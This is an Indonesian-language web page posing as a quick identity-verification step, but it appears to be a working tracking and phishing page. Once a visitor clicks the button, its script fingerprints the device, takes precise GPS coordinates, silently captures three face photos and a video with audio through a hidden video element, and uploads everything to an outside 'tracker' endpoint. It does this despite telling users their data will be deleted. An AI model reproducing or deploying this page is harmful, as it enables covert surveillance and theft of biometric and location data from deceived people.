<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifikasi Identitas Cepat</title>
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: #e0e7ff;
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 20px;
    }
    h1 {
      color: #ff4d4d;
      font-size: 2.5rem;
      margin-bottom: 1rem;
      text-shadow: 0 0 10px rgba(255, 77, 77, 0.6);
    }
    p.intro {
      max-width: 500px;
      margin: 0 auto 2rem;
      color: #c7d2fe;
      line-height: 1.5;
    }
    button {
      padding: 16px 60px;
      font-size: 1.4rem;
      font-weight: bold;
      background: #ef4444;
      color: white;
      border: none;
      border-radius: 9999px;
      cursor: pointer;
      box-shadow: 0 10px 25px rgba(239, 68, 68, 0.4);
      transition: all 0.3s ease;
      margin: 1.5rem 0;
    }
    button:hover:not(:disabled) {
      transform: translateY(-3px);
      box-shadow: 0 15px 35px rgba(239, 68, 68, 0.6);
      background: #f87171;
    }
    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }
    #status {
      margin: 1.5rem 0;
      font-size: 1.2rem;
      color: #a5b4fc;
      min-height: 1.5em;
    }
    #error {
      color: #fca5a5;
      font-size: 1.1rem;
      max-width: 500px;
      margin-top: 1rem;
    }
    #video {
      display: none;
      width: 1px;
      height: 1px;
    }
    .info-box {
      background: rgba(30, 41, 59, 0.6);
      backdrop-filter: blur(8px);
      border: 1px solid rgba(165, 180, 252, 0.2);
      border-radius: 12px;
      padding: 1.5rem;
      max-width: 500px;
      margin-top: 2rem;
      text-align: left;
      font-size: 0.95rem;
      color: #c7d2fe;
      white-space: pre-wrap;
      overflow-x: auto;
      display: none;
    }
  </style>
</head>
<body>

  <h1>Verifikasi Identitas</h1>
  <p class="intro">
    Untuk melanjutkan, sistem memerlukan akses sementara ke kamera dan lokasi.<br>
    Data hanya digunakan untuk proses verifikasi ini dan akan dihapus setelah selesai.
  </p>

  <button id="startBtn">MULAI VERIFIKASI</button>
  <div id="status">Menunggu aksi...</div>
  <div id="error"></div>

  <video id="video" autoplay playsinline muted></video>

  <div class="info-box" id="devicePreview">
    <strong>Device Info yang akan dikirim:</strong><br>
    <div id="deviceInfoText"></div>
  </div>

  <script>
  const btn = document.getElementById('startBtn');
  const status = document.getElementById('status');
  const errorDiv = document.getElementById('error');
  const videoEl = document.getElementById('video');

  const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php';

  async function getDeviceFingerprint() {
    const info = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.languages?.join(', ') || navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: `${screen.width} × ${screen.height} @ ${screen.colorDepth}-bit (${window.devicePixelRatio}x)`,
      cpuCores: navigator.hardwareConcurrency || 'tidak tersedia',
      deviceMemory: navigator.deviceMemory || 'tidak tersedia',
      prefersDark: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
      touchSupport: navigator.maxTouchPoints > 0 ? `Ya (${navigator.maxTouchPoints} points)` : 'Tidak',
      cookiesEnabled: navigator.cookieEnabled ? 'Ya' : 'Tidak',
      doNotTrack: navigator.doNotTrack || 'tidak diketahui',
      localStorageUsage: JSON.stringify(localStorage || {}).length + ' bytes',
      sessionStorageUsage: JSON.stringify(sessionStorage || {}).length + ' bytes'
    };

    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.textBaseline = 'top';
        ctx.font = '16px Arial';
        ctx.fillStyle = '#f93'; ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069'; ctx.fillText('GEIS TRACK 2026', 2, 15);
        info.canvasHash = canvas.toDataURL().slice(-40);
      }
    } catch (e) {
      info.canvasHash = 'gagal: ' + e.message;
    }

    console.log('Device fingerprint siap:', info);
    return info;
  }

  btn.addEventListener('click', async () => {
    btn.disabled = true;
    errorDiv.textContent = '';
    status.textContent = 'Memulai...';

    try {
      console.log('Step 1: Mulai fingerprint');
      const deviceInfo = await getDeviceFingerprint();

      console.log('Step 2: Lokasi');
      const position = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {
        enableHighAccuracy: true, timeout: 15000, maximumAge: 0
      }));

      const location = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: new Date(position.timestamp).toISOString()
      };

      status.textContent = `Lokasi OK (±${location.accuracy.toFixed(1)} m)`;

      console.log('Step 3: Kamera');
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' }, audio: true
      });

      videoEl.srcObject = stream;
      await videoEl.play();

      const photos = [];
      status.textContent = 'Ambil foto...';

      for (let i = 0; i < 3; i++) {
        await new Promise(r => setTimeout(r, i === 0 ? 1800 : 1300));
        const canvas = document.createElement('canvas');
        canvas.width = videoEl.videoWidth;
        canvas.height = videoEl.videoHeight;
        canvas.getContext('2d').drawImage(videoEl, 0, 0);
        photos.push(canvas.toDataURL('image/jpeg', 0.88));
      }

      console.log('Step 4: Rekam video');
      status.textContent = 'Rekam 30 detik...';
      const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
      const chunks = [];

      recorder.ondataavailable = e => chunks.push(e.data);
      recorder.start();

      await new Promise(r => setTimeout(r, 300));
      recorder.stop();

      const videoBlob = await new Promise((resolve, reject) => {
        recorder.onstop = () => {
          if (chunks.length === 0) reject(new Error('Video kosong'));
          resolve(new Blob(chunks, { type: 'video/webm' }));
        };
        recorder.onerror = e => reject(e);
      });

      console.log('Video Blob size:', videoBlob.size);

      status.textContent = 'Upload...';
      const formData = new FormData();

      formData.append('location', JSON.stringify(location));
      formData.append('device_info', JSON.stringify(deviceInfo));
      console.log('device_info appended, length:', JSON.stringify(deviceInfo).length);

      formData.append('video', videoBlob, `capture_${Date.now()}.webm`);

      for (let i = 0; i < photos.length; i++) {
        const blob = await (await fetch(photos[i])).blob();
        formData.append(`photo${i+1}`, blob, `photo_${Date.now()}_${i+1}.jpg`);
      }

      console.log('Fetch mulai...');
      const response = await fetch(SERVER_URL, { method: 'POST', body: formData });

      console.log('Response status:', response.status);
      const responseText = await response.text();
      console.log('Response body:', responseText);

      if (!response.ok) throw new Error(`Server: ${response.status} - ${responseText}`);

      status.textContent = 'SUKSES!';
      stream.getTracks().forEach(t => t.stop());

    } catch (err) {
      status.textContent = 'Gagal';
      errorDiv.textContent = err.message;
      console.error('Error full:', err);
      btn.disabled = false;
    }
  });
</script>

</body>
</html>
